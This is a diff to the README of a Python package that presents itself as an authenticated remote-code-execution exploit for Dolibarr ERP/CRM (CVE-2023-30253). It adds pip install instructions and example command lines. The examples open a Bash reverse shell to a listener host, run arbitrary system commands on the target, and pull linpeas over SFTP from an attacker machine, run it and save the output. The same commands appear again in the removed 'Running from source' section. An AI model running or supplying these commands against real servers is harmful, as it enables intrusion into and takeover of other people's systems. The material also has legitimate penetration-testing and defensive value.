@@ -4,7 +4,11 @@ An authenticated RCE exploit for Dolibarr ERP/CRM CVE-2023-30253.
 
 ## Installation
 
-???
+You can either install the package from the PyPi repository with `pip` or `git clone` the source directly from GitHub.
+
+```shell
+pip install dolibabyphp
+```
 
 ## Usage
 
@@ -41,19 +45,23 @@ Commands:
   wget                   Downloads the file at the specified URL to to the...
 ```
 
+### Examples
+
+```shell
+# Reverse shell with Bash
+python -m dolibabyphp http://example.com/ username1 pass_word23 bash-reverse-shell --lhost 1.2.3.4 --lport 4444
+
+# Testing with a proxy
+python -m dolibabyphp --proxy http://127.0.0.1:8080 http://example.com/ username1 pass_word23 custom-system-payload --payload "uname -a"
+
+# SFTP linpeas to the target, execute it, and save the output to a file on the attacker machine.
+python -m dolibabyphp -o ./linpeas-output.txt http://example.com/ username1 pass_word23 sftp --private-key-file ./id_ed25519 sftp://me@1.2.3.4:2222/linpeas.sh ./style.css
+```
+
 ## Running from source
 
 In order to run the project from the source code, make sure you add the `src/` directory to the `PYTHONPATH` and then import the module `dolibabyphp` with the `-m` flag.
 
 ```shell
 PYTHONPATH="$(pwd)/src/" python -m dolibabyphp
-
-# Reverse shell with Bash
-PYTHONPATH="$(pwd)/src/" python -m dolibabyphp http://example.com/ username1 pass_word23 bash-reverse-shell --lhost 1.2.3.4 --lport 4444
-
-# Testing with a proxy
-PYTHONPATH="$(pwd)/src/" python -m dolibabyphp --proxy http://127.0.0.1:8080 http://example.com/ username1 pass_word23 custom-system-payload --payload "uname -a"
-
-# SFTP linpeas and execute it
-PYTHONPATH="$(pwd)/src/" python -m dolibabyphp -o ./linpeas-output.txt http://example.com/ username1 pass_word23 sftp --private-key-file ./id_ed25519 sftp://me@1.2.3.4:2222/linpeas.sh ./style.css
 ```
